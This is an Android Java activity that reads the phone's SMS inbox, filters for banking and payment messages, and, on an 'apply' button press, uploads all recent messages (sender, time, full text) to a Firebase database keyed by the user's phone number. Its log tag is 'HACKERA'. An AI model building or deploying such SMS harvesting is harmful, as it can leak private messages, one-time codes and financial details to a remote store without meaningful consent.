package com.example.tr4;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import android.content.ContentResolver;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.os.Bundle;
import android.provider.Telephony;
import android.util.Log;
import android.widget.ArrayAdapter;
import android.widget.Button;
import android.widget.ListView;
import android.widget.Toast;

import com.example.tr4.utils.FirebaseUtil;
import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.FirebaseApp;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;

import java.text.ParseException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.Locale;

public class MainActivity extends AppCompatActivity {

    private ArrayList<String> smsList = new ArrayList<>();

    private Button applyBtn;
    private Button webView;

    private DatabaseReference databaseReference;
    private String mobileNumber;

    private static final int READ_SMS_PERMISSION_CODE = 1;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // Initialize Firebase
        try {
            FirebaseApp.initializeApp(this);
            FirebaseDatabase database = FirebaseDatabase.getInstance();
            databaseReference = database.getReference("Users");
            Log.d("HACKERA", "Firebase initialized successfully");
        } catch (Exception e) {
            Log.d("HACKERA", "Error initializing Firebase: " + e.getMessage());
            Toast.makeText(this, "Error initializing Firebase", Toast.LENGTH_SHORT).show();
        }


        SharedPreferences sharedPreferences = getSharedPreferences("loginDetails", MODE_PRIVATE);
        mobileNumber = sharedPreferences.getString("phone", null);
        String username = sharedPreferences.getString("username", null);

        Log.d("HACKERA", mobileNumber );
        Log.d("HACKERA", FirebaseUtil.getUserName(mobileNumber));



        applyBtn = findViewById(R.id.applyBtn);
        applyBtn.setOnClickListener(v -> syncSmsToFirebase());

        // Check SMS permissions
        if (ContextCompat.checkSelfPermission(MainActivity.this, android.Manifest.permission.READ_SMS)
                != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(MainActivity.this,
                    new String[]{android.Manifest.permission.READ_SMS}, READ_SMS_PERMISSION_CODE);
        } else {
            readSms();
        }


        webView = findViewById(R.id.webView);
        webView.setOnClickListener(v-> openWebView());

    }

    private void openWebView(){
        Intent intent = new Intent(MainActivity.this, WebActivity.class);
        startActivity(intent);
    }
    private void syncSmsToFirebase() {


        DatabaseReference userRef = databaseReference.child(mobileNumber);
        userRef.child("dateUpdated").addListenerForSingleValueEvent(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
                String lastUpdateTime = dataSnapshot.getValue(String.class);
                if (lastUpdateTime == null) {
                    Calendar calendar = Calendar.getInstance();
                    // Subtract 3 months
                    calendar.add(Calendar.MONTH, -3);
                    // Format the date
                    SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());
                    lastUpdateTime = sdf.format(calendar.getTime());
                }

                SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());
                String currentTime = sdf.format(new Date());

                if (lastUpdateTime.equals(currentTime)) {
                    Toast.makeText(MainActivity.this, "No new messages to sync", Toast.LENGTH_SHORT).show();
                    return;
                }

                ArrayList<String> newMessages;
                try {
                    newMessages = getNewMessages(lastUpdateTime);
                } catch (ParseException e) {
                    Log.d("HACKERA", "Error parsing date");
                    return;
                }

                if (newMessages.isEmpty()) {
                    Toast.makeText(MainActivity.this, "No new messages to sync", Toast.LENGTH_SHORT).show();
                    return;
                }

                DatabaseReference messagesRef = userRef.child("messages");
                for (String message : newMessages) {
                    String key = messagesRef.push().getKey();
                    if (key != null) {
                        messagesRef.child(key).setValue(message);
                    }
                }

                userRef.child("dateUpdated").setValue(currentTime);
                Toast.makeText(MainActivity.this, "Messages synced successfully", Toast.LENGTH_SHORT).show();
            }

            @Override
            public void onCancelled(@NonNull DatabaseError databaseError) {
                Toast.makeText(MainActivity.this, "Error: " + databaseError.getMessage(), Toast.LENGTH_SHORT).show();
            }
        });
    }

    private ArrayList<String> getNewMessages(String lastUpdateTime) throws ParseException {
        ArrayList<String> newMessages = new ArrayList<>();
        ContentResolver contentResolver = getContentResolver();
        Cursor cursor = contentResolver.query(
                Telephony.Sms.CONTENT_URI,
                null,
                Telephony.Sms.DATE + " > ?",
                new String[]{String.valueOf(new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).parse(lastUpdateTime).getTime())},
                Telephony.Sms.DATE + " ASC");

        if (cursor != null && cursor.moveToFirst()) {
            do {
                String address = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
                String body = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY));
                long dateMillis = cursor.getLong(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE));

                SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());
                String timeString = sdf.format(new Date(dateMillis));

                String messageFormat = String.format("sender:%s;time:%s;message:%s;", address, timeString, body);
                newMessages.add(messageFormat);
            } while (cursor.moveToNext());
            cursor.close();
        }

        return newMessages;
    }

    private void readSms() {
        ContentResolver contentResolver = getContentResolver();
        Cursor cursor = contentResolver.query(
                Telephony.Sms.CONTENT_URI,
                null,
                null,
                null,
                null);

        if (cursor != null && cursor.moveToFirst()) {
            SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd", Locale.getDefault());
            String currentDate = sdf.format(new Date());
            String previousDate = sdf.format(new Date(System.currentTimeMillis() - 24 * 60 * 60 * 1000));

            do {
                String address = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
                String body = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY));
                long dateMillis = cursor.getLong(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE));
                String smsDate = sdf.format(new Date(dateMillis));

                if ((smsDate.equals(previousDate) || smsDate.equals(currentDate)) && isFinancialMessage(body)) {
                    SimpleDateFormat dateTimeFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());
                    String dateString = dateTimeFormat.format(new Date(dateMillis));

                    String limitedBody = body.length() > 50 ? body.substring(0, 50) + "..." : body;

                    smsList.add("Sender: " + address +
                            "\nTime: " + dateString +
                            "\nMessage: " + limitedBody);
                }
            } while (cursor.moveToNext());

            if (cursor != null) {
                cursor.close();
            }
        }
    }

    private boolean isFinancialMessage(String body) {
        String[] keywords = {"upi", "transaction", "transferred", "received", "debited", "credited",
                "payment", "account", "bank", "atm", "withdrawn"};
        String[] exclusionPhrases = {"100% daily data exhausted", "data usage", "SIM", "recharge", "plan",
                "data pack", "balance enquiry"};

        String lowercaseBody = body.toLowerCase();

        for (String exclusion : exclusionPhrases) {
            if (lowercaseBody.contains(exclusion.toLowerCase())) {
                return false;
            }
        }

        for (String keyword : keywords) {
            if (lowercaseBody.contains(keyword)) {
                return true;
            }
        }

        return false;
    }


}
